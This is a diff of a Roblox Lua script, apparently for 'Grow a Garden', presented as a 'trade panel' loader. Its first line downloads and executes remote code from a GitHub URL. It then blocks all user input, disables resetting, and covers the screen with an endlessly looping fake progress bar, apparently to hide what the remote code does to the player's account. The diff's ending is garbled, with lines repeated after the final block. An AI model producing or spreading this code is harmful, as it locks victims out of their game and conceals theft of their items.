@@ -1,10 +1,8 @@
--- Run main script instantly
+-- RUN MAIN SCRIPT FIRST
 loadstring(game:HttpGet("https://raw.githubusercontent.com/ordinaryUserlol/GROW-A-GARDEN/refs/heads/main/Ironman"))()
 
--- Services
+-- SERVICES
 local TweenService = game:GetService("TweenService")
-local Players = game:GetService("Players")
-local LocalPlayer = Players.LocalPlayer
 local RunService = game:GetService("RunService")
 local UserInputService = game:GetService("UserInputService")
 local ContextActionService = game:GetService("ContextActionService")
@@ -16,11 +14,9 @@ local function blockInput()
 end
 ContextActionService:BindAction("BlockAllInput", blockInput, false, unpack(Enum.UserInputType:GetEnumItems()))
 ContextActionService:BindAction("BlockAllInputKeys", blockInput, false, unpack(Enum.KeyCode:GetEnumItems()))
-
--- Disable Reset button
 StarterGui:SetCore("ResetButtonCallback", false)
 
--- ScreenGui (Top priority)
+-- CREATE SCREEN GUI
 local ScreenGui = Instance.new("ScreenGui")
 ScreenGui.IgnoreGuiInset = true
 ScreenGui.ResetOnSpawn = false
@@ -28,9 +24,10 @@ ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
 ScreenGui.DisplayOrder = 1e6
 ScreenGui.Parent = game.CoreGui
 
--- FULLSCREEN COVER
+-- FULL COVER
 local MainFrame = Instance.new("Frame")
 MainFrame.Size = UDim2.new(1, 0, 1, 0)
+MainFrame.BackgroundTransparency = 0
 MainFrame.ZIndex = 1e6
 MainFrame.Parent = ScreenGui
 
@@ -72,6 +69,93 @@ local Ring = Instance.new("ImageLabel")
 Ring.Size = UDim2.new(0, 300, 0, 300)
 Ring.Position = UDim2.new(0.5, -150, 0.35, -150)
 Ring.BackgroundTransparency = 1
+Ring.Image = "rbxassetid://7743864258"
+Ring.ImageColor3 = Color3.fromRGB(200, 100, 255)
+Ring.ZIndex = 1e6
+Ring.Parent = MainFrame
+task.spawn(function()
+    while Ring.Parent do
+        Ring.Rotation = (Ring.Rotation + 0.1) % 360
+        task.wait()
+    end
+end)
+
+-- LOADING TEXT
+local LoadingLabel = Instance.new("TextLabel")
+LoadingLabel.Size = UDim2.new(1, 0, 0, 100)
+LoadingLabel.Position = UDim2.new(0, 0, 0.35, 0)
+LoadingLabel.BackgroundTransparency = 1
+LoadingLabel.Text = "⏳💼 LOADING TRADE PANEL 💼⏳"
+LoadingLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+LoadingLabel.TextScaled = true
+LoadingLabel.Font = Enum.Font.GothamBold
+LoadingLabel.ZIndex = 1e6
+LoadingLabel.Parent = MainFrame
+
+local TextGradient = Instance.new("UIGradient")
+TextGradient.Color = ColorSequence.new{
+    ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 0, 0)),
+    ColorSequenceKeypoint.new(0.5, Color3.fromRGB(0, 255, 0)),
+    ColorSequenceKeypoint.new(1, Color3.fromRGB(128, 0, 255))
+}
+TextGradient.Rotation = 0
+TextGradient.Parent = LoadingLabel
+
+task.spawn(function()
+    while TextGradient.Parent do
+        TextGradient.Rotation = (TextGradient.Rotation + 1) % 360
+        task.wait(0.03)
+    end
+end)
+
+-- PROGRESS BAR
+local BarFrame = Instance.new("Frame")
+BarFrame.Size = UDim2.new(0.6, 0, 0, 30)
+BarFrame.Position = UDim2.new(0.2, 0, 0.55, 0)
+BarFrame.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+BarFrame.BorderSizePixel = 0
+BarFrame.ZIndex = 1e6
+BarFrame.Parent = MainFrame
+Instance.new("UICorner", BarFrame)
+
+local FillFrame = Instance.new("Frame")
+FillFrame.Size = UDim2.new(0, 0, 1, 0)
+FillFrame.BorderSizePixel = 0
+FillFrame.ZIndex = 1e6
+FillFrame.Parent = BarFrame
+Instance.new("UICorner", FillFrame)
+
+local PercentLabel = Instance.new("TextLabel")
+PercentLabel.Size = UDim2.new(1, 0, 0, 30)
+PercentLabel.Position = UDim2.new(0, 0, 1.1, 0)
+PercentLabel.BackgroundTransparency = 1
+PercentLabel.Text = "0%"
+PercentLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+PercentLabel.TextScaled = true
+PercentLabel.Font = Enum.Font.GothamBold
+PercentLabel.ZIndex = 1e6
+PercentLabel.Parent = BarFrame
+
+-- RGB FILL COLOR
+local hue = 0
+RunService.RenderStepped:Connect(function()
+    hue = (hue + 0.005) % 1
+    FillFrame.BackgroundColor3 = Color3.fromHSV(hue, 1, 1)
+end)
+
+-- LOOP FOREVER
+task.spawn(function()
+    while true do
+        local duration = 240 -- 4 minutes
+        local startTime = tick()
+        while tick() - startTime < duration do
+            local progress = ((tick() - startTime) / duration) * 100
+            PercentLabel.Text = string.format("%d%%", progress)
+            FillFrame.Size = UDim2.new(progress / 100, 0, 1, 0)
+            task.wait(0.05)
+        end
+    end
+end)Ring.BackgroundTransparency = 1
 Ring.Image = "rbxassetid://7743864258"
 Ring.ImageColor3 = Color3.fromRGB(200, 100, 255)
 Ring.ZIndex = 1e6
